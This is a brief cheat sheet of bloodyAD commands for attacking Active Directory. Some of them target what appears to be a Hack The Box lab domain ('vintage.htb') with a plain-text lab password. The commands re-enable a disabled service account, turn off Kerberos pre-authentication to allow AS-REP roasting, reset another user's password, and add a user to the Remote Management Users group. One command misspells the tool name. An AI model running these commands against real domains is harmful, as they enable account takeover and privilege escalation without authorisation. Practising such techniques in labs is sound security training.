Enable Account:

```bash
bloodyAD --host "dc01.vintage.htb" -d "vintage.htb" --kerberos --dc-ip 10.129.199.135 -u "p.rosa" -p Rosaisbest123 -k remove uac SVC_SQL -f ACCOUNTDISABLE
```

Enable ASREP on an account:

```bash
bloodyAD --host "dc01.vintage.htb" -d "vintage.htb" --kerberos --dc-ip 10.129.199.135 -u "p.rosa" -p Rosaisbest123 -k add uac SVC_SQL -f DONT_REQ_PREAUTH
```

Change users password:

```bash
bloodyAD -d domain.local --host x.x.x.x -u username -p username set password target_user new_password
```

Add user to a group:

```bash
bloodAD -d domain.local --host x.x.x.x -u username -p username add groupMember 'Remote Management Users' user_to_add
```

